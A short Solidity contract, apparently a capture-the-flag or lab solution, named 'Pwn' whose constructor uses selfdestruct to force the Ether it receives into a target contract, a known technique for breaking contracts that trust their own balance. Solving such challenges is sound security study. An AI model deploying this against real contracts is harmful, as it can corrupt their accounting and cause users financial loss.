// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract Pwn {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}